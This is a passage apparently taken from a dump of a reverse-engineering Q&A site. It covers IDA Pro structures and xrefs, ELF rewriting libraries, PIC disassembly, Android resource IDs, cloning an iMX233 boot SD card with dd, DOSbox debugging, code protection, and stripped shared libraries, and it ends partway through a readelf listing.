<p>I do not know the size of the structure, but I've seen <code>[ebp+0f14h]</code>. Therefore, I've defined a custom IDA sturct of size <code>0xF14</code>. Now I'm having trouble with applying this custom structure to this pointer. I've tried <code>Alt+Q</code> then selecting my own custom struct, but it is not working. The  output window says <code>Command ""DeclareStructVar"" failed</code></p>

<p>My custom struct:</p>

<pre><code>00000000 custom_sturct   struc ; (sizeof=0xF14)
00000000                 db ? ; undefined
00000001                 db ? ; undefined
00000002                 db ? ; undefined
[...same stuff...]
00000F11                 db ? ; undefined
00000F12                 db ? ; undefined
00000F13 field_F13       db ?
00000F14 custom_sturct   ends
00000F14
</code></pre>

<p>I'm using IDA Pro 6.3</p>
","<p>To set register as an offset to a structure in a sequence of assembly code, you'll need to select that sequence and then hit <kbd>T</kbd>. A pop up dialog called ""Structure offsets"" will appear, where you can supply the register and structure it points to, and you'll see all references IDA recognized using it.</p>

<p>Lets take the following code snippet taken from calc.exe for example:</p>

<p><a href=""https://i.stack.imgur.com/abcBG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/abcBG.png"" alt=""Example of initial state""></a></p>

<p>After selecting the relevant code and hitting <kbd>T</kbd> IDA automatically identified we're setting the <code>ECX</code> register, suggests possible valid structures to the left and the offsets and the selected structure's values.</p>

<p><a href=""https://i.stack.imgur.com/VrXAH.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/VrXAH.png"" alt=""Structure offsets dialog""></a></p>

<p>After assigning a valid structure, the code looks like this:</p>

<p><a href=""https://i.stack.imgur.com/wWyYN.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wWyYN.png"" alt=""code after structure offset assignment""></a></p>

<p>Please notice the following caveats/remarks:</p>

<ol>
<li>IDA completely ignored the <code>add ecx, 4</code> line and additionally did not handle the <code>mov [ecx+eax*2], dx</code> too well because of that. Hitting <kbd>T</kbd> for that specific line and suppling a non-zero offset delta will let you handle that properly, albeit manually.  </li>
<li>As mentioned in the comments, manually setting a register's name completely disables all IDA's representation of the register and instead displays the user supplied free text. This means any offset definitions will be hidden by any register custom name.</li>
<li>If you've seen <code>[ebp+0f14h]</code>, the structure's size is <em>at least</em> 0xF15 bytes, as the structure is being written to at offset <code>0x0F14</code>, meaning at least 0xF15 bytes are available to it. If you've seen <code>DWORD [ebp+0f14h]</code> the structure is at least <code>0x0F18</code> bytes long.</li>
</ol>

<p>Those caveats are at least partially mitigated by third party tools like <a href=""https://sark.readthedocs.io/en/latest/plugins/autostruct.html"" rel=""nofollow noreferrer"">Autostruct</a></p>
","13491"
"What are the available libraries to statically modify ELF executables?","2566","","<p>I would like to be able to rewrite or reorganize an ELF binary program directly from the executable format (not at compile-time). </p>

<p>The only library I know to do this is <a href=""http://hg.secdev.org/elfesteem/"">elfesteem</a> (used in <a href=""http://code.google.com/p/smiasm/"">Miasm</a>). But, there must be others. So, what are the libraries or frameworks that you use to statically modify ELF executables ?</p>
","<p>I just stumbled on this project <a href=""http://www.eresi-project.org/"" rel=""nofollow"">ERESI</a>. The project itself looks quite ambitious and supports mainly Intel and Sparc processors with some support for others. There are lots of tools as well that might come in handy. It does have one specific tool that sounds like if fits the bill exactly and quite a few others that are related: </p>

<blockquote>
  <p><a href=""http://www.eresi-project.org/wiki/Evarista"" rel=""nofollow"">Evarista</a>: A work-in-progress static binary program transformer
  entirely implemented in the ERESI language.</p>
</blockquote>

<p>Patchelf might come in handy for modifying the linker or rpaths specified in an elf:</p>

<blockquote>
  <p><a href=""http://nixos.org/patchelf.html"" rel=""nofollow"">PatchELF</a> is a small utility to modify the dynamic linker and RPATH of
  ELF executables</p>
</blockquote>

<p>Also there is this <a href=""http://www.blackhat.com/presentations/bh-europe-01/shaun-clowes/bh-europe-01-clowes.ppt"" rel=""nofollow"">presentation about injectso</a> which seems relevate to the topic static and dynamic patching of elf binaries. Admittedly the coverage on static binaries is limited but that is to be expected as it is more complex that just being a library interposer.</p>

<p>If you are looking for libraries specifically then the ERESI project does use alot of libraries so you could probably take Evarista as a guide and write something more in line with your goals with thier libraries.</p>

<blockquote>
  <p><a href=""http://www.eresi-project.org/wiki/TheLibELFsh"" rel=""nofollow"">libelfsh</a> : the binary manipulation library used by ELFsh, Kernsh,
  E2dbg, and Etrace.</p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheEmbeddedELFDebugger"" rel=""nofollow"">libe2dbg</a> : the embedded debugger library operating within the
  debuggee program.</p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibASM"" rel=""nofollow"">libasm</a> : the smart disassembling engine (x86, sparc, mips, arm)
  that gives both syntactic and semantic attributes to instructions and
  their operands.</p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibMjollnir"" rel=""nofollow"">libmjollnir</a> : the control flow analysis and fingerprinting
  library. </p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibReVM"" rel=""nofollow"">librevm</a> : the Runtime ERESI virtual machine, that contains the
  central runtime environment implementation of the framework.</p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibStdEresi"" rel=""nofollow"">libstderesi</a> : the standard ERESI library containing more than
  100 built-in analysis commands.</p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibAspect"" rel=""nofollow"">libaspect</a> : the aspect library brings its API to reflect code
  and data structures in the ERESI language.</p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibEdFmt"" rel=""nofollow"">libedfmt</a> : the ERESI debug format library which can convert
  dwarf and stabs debug formats to the ERESI debug format.</p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibEtrace"" rel=""nofollow"">libetrace</a> : the ERESI tracer library, on which Etrace is based. </p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibKernsh"" rel=""nofollow"">libkernsh</a> : the Kernel shell library is the kernel accessibility
  library on which Kernsh is based.</p>
  
  <p><a href=""http://www.eresi-project.org/wiki/TheLibGdbWrap"" rel=""nofollow"">libgdbwrap</a> : The GDB serial protocol library, for compatibility
  between ERESI and GDB/VMware/Bochs/Qemu/OpenOCD.</p>
</blockquote>
","1847"
"What to do when IDA cannot provide a function name?","2564","","<p>For learning (<em>and fun</em>) I have been analyzing a text editor application using IDA Pro. While looking at the disassembly, I notice many function calls are made by explicitly calling the name of the function. For example, I notice IDA translates most function calls into the following two formats.</p>

<pre><code>call cs:CoCreateInstance
</code></pre>

<p>Or</p>

<pre><code>call WinSqmAddToStream
</code></pre>

<p>But sometimes the format does not use a function name. The following example includes the code leading up to the line in question. The third line of code seem to be ""missing"" the function name. (The comments are my own.)</p>

<pre><code>mov rcx, [rsp+128h+var_D8]    // reg CX gets the address at stack pointer+128h+var_D8 bytes 
mov r8, [rcx]                 // the address at reg CX is stored to reg r8
call qword ptr [r8 + 18h]     // at address rax+18h, call function defined by qword bytes 
</code></pre>

<p>My questions are as follows:</p>

<ol>
<li><p>How do I make the connection between <code>call qword ptr &lt;address&gt;</code> and a function in the disassembly?</p></li>
<li><p>I understand that IDA cannot use a function name here since it does not know the value stored at the register R8... so what causes this? Was there a certain syntax or convention used by the developer? In other words, did the developer call the function <code>WinSqmAddToStream</code> in a different manner than the function at <code>[r8+18h]</code>?</p></li>
</ol>
","<p>To connect an indirect call to its target (if you know it) you can do the following:</p>

<p>1) Add a custom cross-reference - either with IDC/Python, or from the Cross References subview. If you use scripting, don't forget to add the XREF_USER flag so IDA does not delete it on reanalysis.</p>

<p>2) Use the ""callee"" plugin (Edit->Plugins->Change the callee address, or Alt+F11). This will automatically add a cross-reference and also a comment next to the call.</p>

<p>As for why the explicit call is not present in the binary there can be many explanations. The snippet you're showing looks like a virtual function call, and they are usually done only in this manner to account for possibility of the method being overridden in a derived class.</p>
","2121"
"How to directly re-use the dumped content of `.rodata`, `.data` and `.bss` section?","2561","","<p>OK, so basically I want to <strong>re-use</strong> the content from dumped <code>.rodata</code> <code>data</code> and <code>bss</code> section from ELF on Linux 32bit.</p>

<p>The dump command:</p>

<pre><code>objdump -s -j .text elf_binary
objdump -s -j .rodata elf_binary
objdump -s -j .data elf_binary
</code></pre>

<p>and for the <code>.bss</code> section, I am preparing to re-use a bunch of <code>00000000</code> which has the same size of the <code>bss</code> section.</p>

<p>It works fine when I re-use it in <code>nasm</code> assembler in this way.</p>

<pre><code>.section rodata
S_label1: db 0x01
         db 0x02
         ....  
.section data
        db 0x01
S_label2:  db 0x02
         ....
.section bss
S_label3: db 0x00
         db 0x00
         ....

nasm -f elf test.s
</code></pre>

<p>But basically my question is that:</p>

<p>how to re-use these dumped sections in <code>gas</code> asssembler?</p>

<p>Basically <code>gas</code> has a different assemble style, and apparently the data sections representations are different...</p>

<p>I tried for several times and I still can not find the solution..</p>

<p>Did I clearly demonstrate my question..? Could anyone give me some help?</p>

<p>=======update==========</p>

<p>So basically I want to re-use the <code>rodata</code> <code>data</code> and <code>bss</code> sections dumped from another binary.</p>

<p>For example, here is the content of <code>rodata</code> section</p>

<pre><code>03000000 01000200 0a0a556e 736f7274
65642061 72726179 2069733a 20200020
25642000 0a0a536f 72746564 20617272
61792069 733a2020 00
</code></pre>

<p>and I can re-use it in this way:</p>

<pre><code>label1: 
db 0x03
db 0x00
db 0x00
db 0x00
label2: 
db 0x01
db 0x00
db 0x02
db 0x00
.....

mov eax, label1      // of course I will guarantee that I use it correctly
....
</code></pre>

<p>Basically in <code>nasm</code>, I can easily re-use them in the above way, but my question is that , how can I re-use it in <code>gas</code> (or directly use <code>gcc</code>) in a similiar way?</p>

<p>Is it possible?</p>
","<p>As an assembly programmer I would say that <code>gas</code> is rarely used to assemble external code. The task of calling <code>gas</code> is usually left to the compiler, and most of the assembly that <code>gas</code> has to handle in real life is either <code>inlined</code> inside <code>C</code> or <code>C++</code> code or comes from a compiler. But, I believe <a href=""https://web.eecs.umich.edu/~prabal/teaching/eecs373-f11/readings/Assembler.pdf"" rel=""nofollow"">this</a> document by <strong>Dean Elsner</strong>, <strong>Jay Fenlanson</strong> &amp; <strong>friends</strong> is by far the best reference I managed to rely on for quite sometime. It has been updated many times and it covers the 2.19.51 version.</p>

<p>The easy way would be to use <strong>GCC</strong> I would say :</p>

<pre><code>  //Just to avoid make a point :]
  typedef unsigned char byte;

  //
  byte lbl1[] = { 0x03, 0x00, 0x00, 0x00, ... }, 
       lbl2[] = { 0x01, 0x00, 0x02, 0x00, ... };

  //I prefer Intel syntax rather than AT&amp;T, it's somehow cleaner !
  __asm__(""intel_syntax noprefix                 ;""
          ""mov eax, %0                           ;""
          ""mov ebx, %1                           ;""
          ""att_syntax prefix                     ;""
          :                        //output
          : ""r"" (lbl1), ""r"" (lbl2) //input
          : ""%eax"", ""%ebx"");       //clobber
</code></pre>

<p>Well, this is a nice way if you want to concentrate on the assembly code (which is how I do it when I optimize code by hand). </p>

<p>Now, let me explain it a bit. First, you have two arrays containing the retrieved data, nothing fancy. Then you get the assembly code. If you're not familiar with <code>inlined</code> assembly I would recommend you <a href=""http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html"" rel=""nofollow"">this</a> link, though I'll briefly go over my code.
The <code>__asm__</code> directive lets you insert assembly instructions anywhere in a code. At first I tell the assembler that I'll be using Intel's syntax (no % prefix for registers, ...), then I move the content of the register %0 in <code>eax</code>, and then the content of %1 in <code>ebx</code> (%0 is the pointer for <strong>lbl1</strong>, %1 is the pointer for <strong>lbl2</strong>). Then, I switch to AT&amp;T syntax for the rest of the parameters. After the first <strong>:</strong> you can specify output variables. After the second <strong>:</strong> you can specify inputs. In here I passed <strong>lbl1</strong> &amp; <strong>lbl2</strong> and I used <strong>""r""</strong> to let the compiler handle register allocation. You can specify the registers if you know what you're doing. After the last <strong>:</strong> you have to declare the registers used inside the code so that the compiler frees them &amp; uses them for the remaining code generation steps.  </p>
","4241"
"How to see what compiler made PIC ASM code?","2559","","<p>I extracted a .hex file from a PIC16F88. For example:</p>

<pre><code>:020000040000FA
:100000008F3083160F0570388F009B0183129F017C
:1000100083169F0107309C0005108312051483127C
:1000200003131730A0006730A1002930A2000A1284
:100030008A11A20B17280A128A11A10B15280A127D
:100040008A11A00B13280510831203131730A00088
:100050006730A1002930A2000A128A11A20B2C28B5
:100060000A128A11A10B2A280A128A11A00B282829
:020070000D2859
:02400E00782F09
:02401000FF3F70
:00000001FF
</code></pre>

<p>In MPLAB, I imported this .hex file and found the disassembly code, in this case:</p>

<pre><code> 1   000     308F  MOVLW 0x8f                             
 2   001     1683  BSF 0x3, 0x5                           
 3   002     050F  ANDWF 0xf, W                           
 4   003     3870  IORLW 0x70                             
 5   004     008F  MOVWF 0xf                              
 6   005     019B  CLRF 0x1b                              
 7   006     1283  BCF 0x3, 0x5                           
 8   007     019F  CLRF 0x1f                              
 9   008     1683  BSF 0x3, 0x5                           
10   009     019F  CLRF 0x1f                              
11   00A     3007  MOVLW 0x7                              
12   00B     009C  MOVWF 0x1c                             
13   00C     1005  BCF 0x5, 0                             
14   00D     1283  BCF 0x3, 0x5                           
15   00E     1405  BSF 0x5, 0                             
16   00F     1283  BCF 0x3, 0x5                           
17   010     1303  BCF 0x3, 0x6                           
18   011     3017  MOVLW 0x17                             
19   012     00A0  MOVWF 0x20                             
20   013     3067  MOVLW 0x67                             
21   014     00A1  MOVWF 0x21                             
22   015     3029  MOVLW 0x29                             
23   016     00A2  MOVWF 0x22                             
24   017     120A  BCF 0xa, 0x4                           
25   018     118A  BCF 0xa, 0x3                           
26   019     0BA2  DECFSZ 0x22, F                         
27   01A     2817  GOTO 0x17                              
28   01B     120A  BCF 0xa, 0x4                           
29   01C     118A  BCF 0xa, 0x3                           
30   01D     0BA1  DECFSZ 0x21, F                         
31   01E     2815  GOTO 0x15                              
32   01F     120A  BCF 0xa, 0x4                           
33   020     118A  BCF 0xa, 0x3                           
34   021     0BA0  DECFSZ 0x20, F                         
35   022     2813  GOTO 0x13                              
36   023     1005  BCF 0x5, 0                             
37   024     1283  BCF 0x3, 0x5                           
38   025     1303  BCF 0x3, 0x6                           
39   026     3017  MOVLW 0x17                             
40   027     00A0  MOVWF 0x20                             
41   028     3067  MOVLW 0x67                             
42   029     00A1  MOVWF 0x21                             
43   02A     3029  MOVLW 0x29                             
44   02B     00A2  MOVWF 0x22                             
45   02C     120A  BCF 0xa, 0x4                           
46   02D     118A  BCF 0xa, 0x3                           
47   02E     0BA2  DECFSZ 0x22, F                         
48   02F     282C  GOTO 0x2c                              
49   030     120A  BCF 0xa, 0x4                           
50   031     118A  BCF 0xa, 0x3                           
51   032     0BA1  DECFSZ 0x21, F                         
52   033     282A  GOTO 0x2a                              
53   034     120A  BCF 0xa, 0x4                           
54   035     118A  BCF 0xa, 0x3                           
55   036     0BA0  DECFSZ 0x20, F                         
56   037     2828  GOTO 0x28                              
57   038     280D  GOTO 0xd   
</code></pre>

<p>Now I want to know with what compiler this code is compiled. How can I do that? I'm looking for <em>general</em> ways to check what compiler made some ASM code. The code listed is just an example.</p>
","<p>(Answer converted from comment)</p>

<p>Recovering the toolchain provenance of the binary code you've specified, at the very least, requires comparing the results of various PIC compilers, I don't know PIC assembly but the last two instructions look interesting for identifying the compiler (Provided your disassembler has misinterpreted the information at <code>0x38</code>, how can the instruction possibly be called?). </p>

<p>Some compilers generate prologues to functions intended for quick-n-dirty later patching that can be a giveaway as well. Best of luck! </p>
","1371"
"Mapping Android resource IDs to resource string","2557","","<p>I'm trying to reverse engineer an Android app. I've tried using several decompilers, and while I'm getting java source codes to varying levels of accuracy, I'm not able to convert the resource IDs to the resource strings. In the Java source, all I'm getting is the 32bit resource ID, which is meaningless to me. Is there anyway to get the resource string from this resource ID? I did not find any R.java in any of the decompiled code.</p>

<p>Thanks!</p>
","<p>Using apktool you can decompile program's resources.Also you can use JEB to view the resource id.</p>

<p>in res/values you can find id using name in public.xml(maybe publics.xml or 
name.xml) and that's it.</p>

<p>PS:you need to transform the 32bit resource id into HEX before you search it.</p>
","12734"
"Why would copying a micro SD card using dd fail to produce a bootable card?","2546","","<p>I have an embedded device which is loosely based around a <a href=""https://www.olimex.com/Products/OLinuXino/iMX233/"" rel=""nofollow"">Olinixino iMX233</a> design. This has a Freescale iMX233 microprocessor and boots from a socketed 2GB microSD card.</p>

<p>I wish to alter the filesystem, but also backup the filesystem prior to altering it so that I don't brick the device. </p>

<p>To achieve this, I obtained a similar 2GB micro SD card, and cloned the current SD card using <em>dd</em> in a USB card reader:</p>

<pre><code>dd if=/dev/sdc of=HeatmiserSDC.img
</code></pre>

<p>then after swapping cards:</p>

<pre><code>dd if=HeatmiserSDC.img of=/dev/sdc
</code></pre>

<p>When this new card is placed in the device, it fails to boot.</p>

<p>I have also now tried the sg3_utils utility <em>sg_dd</em> which operates at a slightly lower level. This has produced a slightly different image file but still won't boot.</p>

<p>I have also now used a SD to micro SD adapter in a direct SD card interface (/dev/mmcblk0) in a Thinkpad x220. This also failed to boot.</p>

<p>The serial console produces a single error code when it fails to boot, <em>0x8020a007</em>, which doesn't provide much useful during a Google search.</p>

<p>I have tried multiple cards, including some 4GB cards. This doesn't seem to be a space issue - sometimes one 2GB SD card is slightly smaller than another. The board also seems to be using the SD protocol and not the SPI protocol. The SPI protocol is sometimes not very reliable on newer cards.</p>

<p><em>fsutil -l</em> produces the following output:</p>

<pre><code>Disk /dev/sdc: 1996 MB, 1996488704 bytes
8 heads, 7 sectors/track, 69632 cylinders, total 3899392 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x0f6c2d46

   Device Boot      Start         End      Blocks   Id  System
/dev/sdc1            2048       32000       14976+  53  OnTrack DM6 Aux3
/dev/sdc2           32001      200000       84000   83  Linux
/dev/sdc3          200001      400000      100000   83  Linux
/dev/sdc4          400001     3899391     1749695+  83  Linux
</code></pre>

<p>Is there something I am missing here? Some data that isn't copied as part of <em>dd</em>?</p>
","<p>After some searching, it seems that the boot process on the iMX233 is fairly non-standard. By default it looks for a ""Boot Control Block"" (BCB) in the last block of the SD card.</p>

<p>Examining the original SD card, find the last block using <em>fdisk -l</em>:</p>

<pre><code>Disk /dev/mmcblk0: 1996 MB, 1996488704 bytes
4 heads, 16 sectors/track, 60928 cylinders, total 3899392 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x0f6c2d46

        Device Boot      Start         End      Blocks   Id  System
/dev/mmcblk0p1            2048       32000       14976+  53  OnTrack DM6 Aux3
/dev/mmcblk0p2           32001      200000       84000   83  Linux
/dev/mmcblk0p3          200001      400000      100000   83  Linux
/dev/mmcblk0p4          400001     3899391     1749695+  83  Linux
</code></pre>

<p>There are 3899392 sectors.</p>

<p>Examine the last sector of the SD card using <em>dd</em>:</p>

<pre><code>root@kali:~# dd if=/dev/mmcblk0 bs=512 count=1 skip=3899391 2&gt; /dev/null | hexdump -C
00000000  33 22 11 00 01 00 00 00  04 00 00 00 04 00 00 00  |3""..............|
00000010  04 00 00 00 04 08 00 00  50 00 00 00 50 00 00 00  |........P...P...|
00000020  50 00 00 00 50 00 00 00  ef be ad de 00 00 00 00  |P...P...........|
00000030  01 00 00 00 02 00 00 00  03 00 00 00 04 00 00 00  |................|
00000040  05 00 00 00 06 00 00 00  07 00 00 00 08 00 00 00  |................|
00000050  09 00 00 00 0d 0a 00 00  00 0b 00 00 00 0c 00 00  |................|
00000060  00 0d 00 00 00 0e 00 00  00 0f 00 00 00 10 00 00  |................|
00000070  00 11 00 00 00 12 00 00  00 13 00 00 00 14 00 00  |................|
00000080  00 15 00 00 00 16 00 00  00 17 00 00 00 18 00 00  |................|
00000090  00 19 00 00 00 1a 00 00  00 1b 00 00 00 1c 00 00  |................|
000000a0  00 1d 00 00 00 1e 00 00  00 1f 00 00 00 20 00 00  |............. ..|
000000b0  00 21 00 00 00 22 00 00  00 23 00 00 00 24 00 00  |.!...""...#...$..|
000000c0  00 25 00 00 00 26 00 00  00 27 00 00 00 28 00 00  |.%...&amp;...'...(..|
000000d0  00 29 00 00 00 2a 00 00  00 2b 00 00 00 2c 00 00  |.)...*...+...,..|
000000e0  00 2d 00 00 00 2e 00 00  00 2f 00 00 00 30 00 00  |.-......./...0..|
000000f0  00 31 00 00 00 32 00 00  00 33 00 00 00 34 00 00  |.1...2...3...4..|
00000100  00 35 00 00 00 36 00 00  00 37 00 00 00 38 00 00  |.5...6...7...8..|
00000110  00 39 00 00 00 3a 00 00  00 3b 00 00 00 3c 00 00  |.9...:...;...&lt;..|
00000120  00 3d 00 00 00 3e 00 00  00 3f 00 00 00 40 00 00  |.=...&gt;...?...@..|
00000130  00 41 00 00 00 42 00 00  00 43 00 00 00 44 00 00  |.A...B...C...D..|
00000140  00 45 00 00 00 46 00 00  00 47 00 00 00 48 00 00  |.E...F...G...H..|
00000150  00 49 00 00 00 4a 00 00  00 4b 00 00 00 4c 00 00  |.I...J...K...L..|
00000160  00 4d 00 00 00 4e 00 00  00 4f 00 00 00 50 00 00  |.M...N...O...P..|
00000170  00 51 00 00 00 52 00 00  00 53 00 00 00 54 00 00  |.Q...R...S...T..|
00000180  00 55 00 00 00 56 00 00  00 57 00 00 00 58 00 00  |.U...V...W...X..|
00000190  00 59 00 00 00 5a 00 00  00 5b 00 00 00 5c 00 00  |.Y...Z...[...\..|
000001a0  00 5d 00 00 00 5e 00 00  00 5f 00 00 00 60 00 00  |.]...^..._...`..|
000001b0  00 61 00 00 00 62 00 00  00 63 00 00 00 64 00 00  |.a...b...c...d..|
000001c0  00 65 00 00 00 66 00 00  00 67 00 00 00 68 00 00  |.e...f...g...h..|
000001d0  00 69 00 00 00 6a 00 00  00 6b 00 00 00 6c 00 00  |.i...j...k...l..|
000001e0  00 6d 00 00 00 6e 00 00  00 6f 00 00 00 70 00 00  |.m...n...o...p..|
000001f0  00 71 00 00 00 72 00 00  00 73 00 00 00 74 00 00  |.q...r...s...t..|
00000200
</code></pre>

<p>The magic number of 0x33221100 is mentioned in some Freescale documentation, though I was expecting to see it with the opposite endianness. </p>

<p>So to make a successful clone, choose a SD card of larger capacity to ensure nothing is overwritten (or you can resize partitions).</p>

<p>Take an image of the original card:</p>

<pre><code>root@kali:~# dd if=/dev/mmcblk0 of=wholeSD.img
3899392+0 records in
3899392+0 records out
1996488704 bytes (2.0 GB) copied, 98.3687 s, 20.3 MB/s
</code></pre>

<p>Then take an image of just the last sector for the BCB:</p>

<pre><code>root@kali:~# dd if=/dev/mmcblk0 bs=512 count=1 skip=3899391 of=BCB.img
1+0 records in
1+0 records out
512 bytes (512 B) copied, 0.000220203 s, 2.3 MB/s
</code></pre>

<p>Find out how big the new SD card is:</p>

<pre><code>Disk /dev/mmcblk0: 2002 MB, 2002780160 bytes
4 heads, 16 sectors/track, 61120 cylinders, total 3911680 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x0f6c2d46

        Device Boot      Start         End      Blocks   Id  System
/dev/mmcblk0p1            2048       32000       14976+  53  OnTrack DM6 Aux3
/dev/mmcblk0p2           32001      200000       84000   83  Linux
/dev/mmcblk0p3          200001      400000      100000   83  Linux
/dev/mmcblk0p4          400001     3899391     1749695+  83  Linux
</code></pre>

<p>This one is larger with 3911680 sectors.</p>

<p>Move the whole card image onto the new card:</p>

<pre><code>root@kali:~# dd if=wholeSD.img of=/dev/mmcblk0
13899392+0 records in
3899392+0 records out
1996488704 bytes (2.0 GB) copied, 1545.45 s, 1.3 MB/s
</code></pre>

<p>And then move the BCB image to the last sector of the card:</p>

<pre><code>root@kali:~# dd if=BCB.img bs=512 count=1 seek=3911679 of=/dev/mmcblk0
1+0 records in
1+0 records out
512 bytes (512 B) copied, 8.4684e-05 s, 6.0 MB/s
</code></pre>

<p>Note the use of seek (output side) rather than skip (input side).</p>

<p>It is worth double checking that the last block has been written. Several cheap SD cards don't seem to work in the last sectors, possibly because they misreport size.</p>

<p>Now you have a booting card.</p>
","6691"
"Enumerate all XefsTo a Segment in IDAPython","2537","","<p>What is the best method to enumerate all xrefs to addresses in a particular segment? I came up with a brute-force approach (as seen below). The code scans each address in a segment and checks for an XrefTo the address. </p>

<pre><code>seg_list = []
for seg in Segments():
    seg_list.append(seg)

# logic will be added to remove section that are code later
seg_list.reverse()
for seg in seg_list:  
    start = SegStart(seg)
    end = SegEnd(seg)
    while start &lt; end:
        gen_xrefs = XrefsTo(start, 0)
        for xx in gen_xrefs:
            print hex(start), hex(xx.frm)
        start += 1
</code></pre>

<p>This approach is very time consuming if I have multiple large segments. IDA adds <code>DATA XREF</code> comments when viewing the data manually. Are these xrefs stored in an accessible way from IDAPython or is there another more practical approach to find the xrefs to a segment? </p>

<pre><code>mem_15d:00973000                 dd 1C8h dup(0)
mem_15d:00973720 dword_973720    dd 101011Ch, 1000h      ; DATA XREF: mem_f08:00970678o
mem_15d:00973728 off_973728      dd offset off_970178    ; DATA XREF: mem_f08:off_970178o
mem_15d:00973728                                         ; mem_f08:0097017Co 
</code></pre>

<p><em>Note: Enumerating all xrefs from the code is not an option.</em> </p>
","<p>You can use Heads function from idautils module.
So your code will look like that:</p>

<pre><code>import idautils
seg_list = []
for seg in Segments():
    seg_list.append(seg)

# logic will be added to remove section that are code later
seg_list.reverse()
for seg in seg_list:  
    start = SegStart(seg)
    end = SegEnd(seg)
    for ea in idautils.Heads(start, end):
        gen_xrefs = XrefsTo(ea, 0)
        for xx in gen_xrefs:
            print hex(ea), hex(xx.frm)
</code></pre>
","3670"
"How to start a DOS application in DOSbox in debug mode?","2535","","<p>DOSbox compiled with <code>--enable-debug=heavy</code> option becomes a powerful reversing tool. Anytime I feel like checking the disassembly and memory state I just hit <kbd>Alt</kbd>+<kbd>Pause</kbd>.</p>

<p>But, what if I want to see the very first instructions of the program ? How do I start the application so that it immediately enters debug mode before even starting execution ?</p>
","<p>If you build with <code>--enable-debug[=heavy]</code> and run the program via debug.com, it automatically breaks on the first instruction. See the <code>DOS_Execute</code> function in <a href=""https://github.com/Henne/dosbox-svn/blob/master/src/dos/dos_execute.cpp#L479"" rel=""nofollow"">src/dos/dos_execute.cpp</a> and <code>DEBUG_CheckExecuteBreakpoint</code> in <a href=""https://github.com/Henne/dosbox-svn/blob/master/src/debug/debug.cpp#L2080"" rel=""nofollow"">src/debug/debug.cpp</a>.</p>
","6039"
"Stronger than Themida?","2492","","<p>I am new to reverse engineering and file protections. I have made a trading algorithm for Tradestation that I have put into a C++ DLL instead of having the source laying around, and I want to protect it further from reverse engineering. Is there something stronger than Themida out there?</p>
","<p>You might want to review an answer I provided before <a href=""https://reverseengineering.stackexchange.com/questions/118"">over here</a>. Themida and CodeVirtualizer are fine. If you want something stronger you should keep your code on a server or run it on a dedicated hardware dongle intended for copy protection. Make sure the dongle is one that actually runs your algorithms and doesn't just encrypt some parts of the code and run it on the PC side.</p>

<p>Be aware though that all they do is increase the amount of motivation an adversary needs in order to find out how your stuff works. I would examine what the value of your secrets really are. The best something like CodeVirtualizer and Themida can achieve is to create the equivalent of a black box. However it will always be possible to probe your black box with different inputs and observe the outputs. So in best case your protected code will be equivalent to keeping your code running on a server, only accessible offline. If offline is a requirement you're stuck with these sorts of solutions, either something commercial off the shelf or something homegrown. Otherwise I would strong recommending centralizing as much as possible of your algorithms on a server. Why not make your DLL for Tradestation a thin wrapper around a web API?</p>

<p>Trading algorithms, if effective, can definitely fall under something that would be valuable enough to protect on a server. </p>

<p>There's also the issue of mistranslations where CodeVirtualizer or Themida does an incorrect translation of the machine instructions into their own VM instructions which could lead to bugs. Are you willing to accept an incorrect trade and possibly holding a bad position due to translation bugs in the translation engine of Themida, VMProtect or whatever you choose to use?</p>
","8757"
"How are stripped shared libraries linked against?","2485","","<p>Lately I've been reversing the Android framework for the Nexus S mobile phone.
99% of the source code is of course open, but there are few propriety shared libraries which needs to be downloaded in order to compile the operating system.
These shared libraries are stripped from symbols and suddenly I came to understand that I don't really understand how stripped libraries are linked against. How can the linker match referenced library functions if the symbols don't exist?</p>
","<p>Even stripped libraries still must retain the symbols necessary for dynamic linking. These are usually placed in a section named <code>.dynsym</code> and are also pointed to by the entries in the dynamic section.</p>

<p>For example, here's the output of <code>readelf</code> on a stripped Android library:</p>

<pre><code>Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .hash             HASH            000000b4 0000b4 000280 04   A  2   0  4
  [ 2] .dynsym           DYNSYM          00000334 000334 0005b0 10   A  3   6  4
  [ 3] .dynstr           STRTAB          000008e4 0008e4 00042f 00   A  0   0  1
  [ 4] .rel.dyn          REL             00000d14 000d14 000008 08   A  2   2  4
  [ 5] .rel.plt          REL             00000d1c 000d1c 000100 08   A  2   6  4
  [ 6] .plt              PROGBITS        00000e24 000e24 000214 04  AX  0   0  4
  [ 7] .text             PROGBITS        00001038 001038 00210c 00  AX  0   0  8
  [ 8] .rodata           PROGBITS        00003144 003144 000a70 00   A  0   0  4
  [ 9] .ARM.extab        PROGBITS        00003bb4 003bb4 000024 00   A  0   0  4
  [10] .ARM.exidx        ARM_EXIDX       00003bd8 003bd8 000170 00  AL  7   0  4
  [11] .dynamic          DYNAMIC         00004000 004000 0000c8 08  WA  3   0  4
  [12] .got              PROGBITS        000040c8 0040c8 000094 04  WA  0   0  4
  [13] .data             PROGBITS        0000415c 00415c 000004 00  WA  0   0  4
  [14] .bss              NOBITS          00004160 004160 000940 00  WA  0   0  4
  [15] .ARM.attributes   ARM_ATTRIBUTES  00000000 004160 000010 00      0   0  1
